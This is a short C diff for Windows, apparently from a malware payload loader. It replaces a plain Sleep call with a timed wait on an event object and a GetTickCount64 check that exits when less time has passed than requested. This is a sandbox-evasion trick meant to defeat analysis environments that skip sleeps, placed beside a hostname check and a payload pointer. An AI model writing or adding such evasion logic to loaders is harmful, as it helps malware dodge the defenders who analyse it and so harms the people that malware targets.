@@ -13,7 +13,27 @@ int main() {
     }
     #endif // !CHECK_HOSTNAME
 
-    Sleep( DELAY * 1000 );
+    #ifdef DELAY
+    DWORD t0 = GetTickCount64();
+
+    HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
+    if ( WaitForSingleObject( hEvent, DELAY * 1000 ) == WAIT_FAILED ) {
+        #ifdef DEBUG
+        printf( "[-] WaitForSingleObject Failed Wtih Error -> %d\n", GetLastError());
+        #endif // !DEBUG
+        
+        return 1;
+    }
+
+    DWORD t1 = GetTickCount64();
+
+    if ( ( DWORD ) ( t1 - t0 ) < DELAY * 1000 ) {
+        return 1;
+    }
+
+    CloseHandle( hEvent );
+
+    #endif // !DELAY
 
     PBYTE* pbPayload = NULL;
 
